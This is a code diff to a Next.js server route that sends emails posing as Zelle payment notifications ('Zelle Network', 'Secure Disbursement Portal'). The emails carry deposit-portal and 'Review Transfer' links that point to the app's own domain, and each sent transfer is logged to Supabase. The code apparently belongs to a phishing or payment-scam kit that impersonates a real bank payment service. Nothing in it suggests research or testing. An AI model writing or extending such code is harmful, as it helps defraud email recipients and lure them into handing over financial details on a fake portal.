@@ -1,5 +1,11 @@
 import { NextResponse } from "next/server"
 import { generateEmailByTemplateId } from "@/lib/email-template-generators"
+import {
+  generateTransferId,
+  buildDepositLink,
+  buildSendReviewLink,
+  saveTransfer,
+} from "@/services/transferService"
 
 export async function POST(request: Request) {
   try {
@@ -43,23 +49,27 @@ export async function POST(request: Request) {
       )
     }
 
-    const transferId = `ZELLE-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
-    const timestamp = new Date().toISOString()
+    const transferId = generateTransferId()
+    const timestamp  = new Date().toISOString()
 
-    // Build deposit link
+    // Resolve app origin
     const appOrigin =
       process.env.NEXT_PUBLIC_APP_URL?.replace(/\/$/, "") ||
       (request.headers.get("origin") ?? request.headers.get("referer")?.replace(/\/[^/]*$/, "") ?? "")
-    const depositParams = new URLSearchParams({
+
+    // Build deposit-portal link (unique per transfer)
+    const depositLink = buildDepositLink(appOrigin, {
       transferId,
-      amount: amountNum.toString(),
-      recipient: recipientEmail,
+      amount:        amountNum,
+      recipient:     recipientEmail,
       recipientName,
-      bankName: "Zelle Network",
-      message: message || "",
+      bankName:      "Zelle Network",
+      message:       message || "",
       timestamp,
     })
-    const depositLink = `${appOrigin}/deposit-portal/client?${depositParams.toString()}`
+
+    // Build /send review link (injected into email as the "Review Transfer" CTA)
+    const sendLink = buildSendReviewLink(appOrigin, transferId)
 
     // Resolve template ID
     const resolvedBase = templateId || "transfer-received"
@@ -68,13 +78,14 @@ export async function POST(request: Request) {
     // Generate email HTML using the template system
     const emailHtml = generateEmailByTemplateId(resolvedId, {
       recipientName,
-      amount: amountNum,
-      message: message || undefined,
+      amount:      amountNum,
+      message:     message || undefined,
       transferId,
       depositLink,
-      senderName: "Zelle Network",
+      sendLink,
+      senderName:  "Zelle Network",
       institution: "Zelle | Secure Disbursement Portal",
-      bankName: "Zelle",
+      bankName:    "Zelle",
     })
 
     if (!emailHtml) {
@@ -185,9 +196,29 @@ export async function POST(request: Request) {
       )
     }
 
+    // Persist transfer record to Supabase + warm in-memory cache
+    await saveTransfer({
+      transfer_id:     transferId,
+      recipient_email: recipientEmail,
+      recipient_name:  recipientName,
+      amount:          amountNum,
+      message:         message || undefined,
+      sender_name:     "Zelle Network",
+      institution:     "Zelle | Secure Disbursement Portal",
+      bank_name:       "Zelle",
+      template_id:     resolvedBase,
+      language:        language || "en",
+      deposit_link:    depositLink,
+      send_link:       sendLink,
+      email_id:        resendData?.id,
+      status:          "sent",
+    })
+
     return NextResponse.json({
       success: true,
       transferId,
+      depositLink,
+      sendLink,
       emailId: resendData?.id,
       message: "Zelle payment notification sent successfully",
     })
